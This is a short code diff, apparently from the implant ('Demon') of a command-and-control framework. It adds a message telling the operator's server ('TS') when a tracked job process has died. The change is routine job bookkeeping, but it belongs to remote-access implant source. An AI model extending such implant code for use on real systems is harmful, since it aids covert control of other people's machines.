@@ -112,7 +112,12 @@ VOID JobCheckList()
                     {
                         PUTS( "Tracking process is dead." )
                         JobList->State = JOB_STATE_DEAD;
-                        AnonPipesRead( ( ( PANONPIPE ) JobList->Data ) );
+                        AnonPipesRead( ( ( PANONPIPE ) JobList->Data ), JobList->RequestID );
+
+                        // notify the TS that the process is dead, so that the RequestID can be closed
+                        PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_COMMAND_JOB );
+                        PackageAddInt32( Package, DEMON_COMMAND_JOB_DIED );
+                        PackageTransmit( Package, NULL, NULL );
 
                         // free resources
                         Instance.Win32.NtClose( JobList->Handle );
